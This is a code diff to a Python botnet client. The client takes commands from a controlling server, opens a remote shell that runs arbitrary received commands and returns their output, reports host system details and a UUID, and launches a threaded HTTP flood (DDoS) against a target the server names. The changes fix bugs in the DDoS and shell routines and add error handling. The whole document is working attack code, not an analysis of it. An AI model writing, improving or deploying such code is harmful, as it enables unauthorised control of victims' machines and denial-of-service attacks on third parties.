@@ -3,6 +3,7 @@ import subprocess
 import sys
 import os
 import platform
+import time
 import uuid
 import threading
 
@@ -22,13 +23,17 @@ def DDoS(TARGETINFO):
 	TARGETIP=TARGETIP.split(":")
 	FAKEIP=TARGET[2]
 	FAKEIP=FAKEIP.split(":")
+	print(FAKEIP,"   ",TARGETIP)
 	while DDoSing:
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect((TARGETIP[0], TARGET[1]))
-		s.sendto(("GET /" + TARGETIP[0] + " HTTP/1.1\r\n").encode('ascii'), (TARGETIP[0], TARGET[1]))
-		s.sendto(("Host: " + FAKEIP[0] + "\r\n\r\n").encode('ascii'), (TARGETIP[0], TARGET[1]))
-		s.close()
-
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((TARGETIP[0], int(TARGETIP[1])))
+			s.sendto(("GET /" + TARGETIP[0] + " HTTP/1.1\r\n").encode('ascii'), (TARGETIP[0], int(TARGETIP[1])))
+			s.sendto(("Host: " + FAKEIP[0] + "\r\n\r\n").encode('ascii'), (TARGETIP[0], int(TARGETIP[1])))
+			s.close()
+		except Exception as Exec:
+			print("[BOT | Critical] DDoS Failed",Exec)
+			DDoSing=False
 
 def main():
 	global DDoSing,sock
@@ -38,10 +43,10 @@ def main():
 			COMM_RECV=COMM_RECV.decode()
 			print("RECV: ",COMM_RECV)
 			if COMM_RECV=='pingbot':
-				sock.send(str.encode("pingbot"))
-				print("SENT: ","pingbot")
+				sock.send(str.encode("BOT ONLINE"))
+				print("SENT: ","BOT ONLINE")
 			elif COMM_RECV=="shell":
-				sock.send(str.encode("Shell Connected!"))
+				sock.send(str.encode("[Client] Shell Connected!\n"+str(os.getcwd()) + '> '))
 				while True:
 					try:
 						COMM_RECV=sock.recv(BUFFER)
@@ -49,17 +54,20 @@ def main():
 						if COMM_RECV!="":
 							print(COMM_RECV)
 							if COMM_RECV=='exit':
-								sock.send(str.encode("[Client] Closing Shell\nBOT >>"))
+								sock.send(str.encode("[Client] Closing Shell"))
 								break
 							if COMM_RECV[:2] == 'cd':
 								try:
 									os.chdir(COMM_RECV[3:])
 								except:
 									pass
-							COMM_SEND = subprocess.Popen(COMM_RECV[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE )
-							OUTPUT = COMM_SEND.stdout.read()
-							OUTPUT = str(OUTPUT, "utf-8")
-							sock.send(str.encode(OUTPUT + str(os.getcwd()) + '> '))
+							if COMM_RECV=='Request current path':
+								sock.send(str.encode(str(os.getcwd()) + '> '))
+							else:
+								COMM_SEND = subprocess.Popen(COMM_RECV[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE )
+								OUTPUT = COMM_SEND.stdout.read()
+								OUTPUT = str(OUTPUT, "utf-8")
+								sock.send(str.encode(OUTPUT + str(os.getcwd()) + '> '))
 						else:
 							OUTPUT="No output"
 							sock.send(str.encode(OUTPUT + str(os.getcwd()) + '> '))
@@ -68,7 +76,7 @@ def main():
 			elif COMM_RECV[:4]=="ddos":
 				sock.send(str.encode("DDoS Initialising!"))
 				DDoSing=True
-				DDOSTHREAD=threading.Thread(target=DDoS,args=COMM_RECV[4:])
+				DDOSTHREAD=threading.Thread(target=DDoS,args=[COMM_RECV[4:],])
 				DDOSTHREAD.start()
 			elif COMM_RECV=="kill ddos":
 				sock.send(str.encode("Killing DDoS"))
@@ -80,7 +88,9 @@ def main():
 				except:
 					pass
 				break
-			sock.send(str.encode("\nBOT >>"))
+			else:
+				sock.send(str.encode("Unknown Command!"))
+				print("SENT: ","Unknown Command!")
 		except:
 			sock.close()
 			connected=False
@@ -98,7 +108,7 @@ def main():
 							ACK=subprocess.getoutput("uname -a")
 						ACK+="\n"
 						ACK="UUID: "+str(UUID)+"\n"+ACK
-						sock.send(str.encode(ACK + "NET >>"))
+						sock.send(str.encode(ACK))
 						if sock.recv(BUFFER).decode()=="Received":
 							print("Connected")
 							connected=True
@@ -123,7 +133,7 @@ def ACK():
 			ACK=subprocess.getoutput("uname -a")
 		ACK+="\n"
 		ACK="UUID: "+str(UUID)+"\n"+ACK
-		sock.send(str.encode(ACK + "NET >>"))
+		sock.send(str.encode(ACK))
 		if sock.recv(BUFFER).decode()=="Received":
 			main()
 	except Exception as Errored:
